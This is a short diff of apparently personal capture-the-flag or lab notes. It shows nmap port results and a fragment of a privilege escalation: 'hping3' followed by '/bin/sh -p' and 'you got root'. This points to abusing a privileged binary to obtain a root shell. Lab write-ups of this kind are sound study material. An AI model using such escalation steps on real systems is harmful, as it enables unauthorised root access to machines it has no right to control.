@@ -5,8 +5,9 @@
 # 26/1/2023
 
 ----------------------------------------------------
-# nmap result
+# nmap result / exploitation
 ----------------------------------------------------
+```
 PORT    STATE SERVICE
 22/tcp  open  ssh
 80/tcp  open  http
@@ -35,3 +36,4 @@ hping3
 hping3
 /bin/sh -p
 you got root
+```
